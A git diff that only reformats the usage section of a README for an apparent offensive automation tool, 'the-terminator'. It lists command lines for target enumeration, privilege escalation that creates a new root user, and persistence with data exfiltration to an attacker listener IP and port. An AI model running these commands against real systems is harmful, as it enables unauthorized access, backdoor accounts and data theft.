@@ -12,7 +12,7 @@
 
 # how to use
 1) clone the repository to your computer
-- "git clone https://github.com/suffs811/the-terminator.git"
+- `git clone https://github.com/suffs811/the-terminator.git`
 - note: if you choose to only download terminator.py and not the entire repo, you will need to specify a directory wordlist for webpage enumeration ("-w" with the "enum" module of terminator.py)
 
 2) deploy the terminator
@@ -32,18 +32,18 @@ first on your own machine (enum), second time on the target machine after gainin
 
 # syntax
 (stage 1-enumerating target from local machine):
-- python3 terminator.py enum -t <target_ip_to_enumerate>
+- `python3 terminator.py enum -t <target_ip_to_enumerate>`
 (optional: -w <path_to_directory_wordlist> (otherwise, terminator will use default list))
 
 (stage 2-privilege escalation after gaining shell on target machine):
-- python3 terminator.py priv -u <new_root_username> -p <new_root_passwd> 
+- `python3 terminator.py priv -u <new_root_username> -p <new_root_passwd>`
 
 (stage 3-persistence/data exfiltration after gaining root privileges on target machine):
-- python3 terminator.py root -u <new_user_name> -p <new_user_passwd> -l <local_ip> -x <local_listening_port>
+- `python3 terminator.py root -u <new_user_name> -p <new_user_passwd> -l <local_ip> -x <local_listening_port>`
 (optional: -f (bypass root permissions check))
 
 (stage 4-create report on local machine):
-- python3 terminator.py report -o <output_file_name>
+- `python3 terminator.py report -o <output_file_name>`
 
 # details
 stage 1 - enumeration
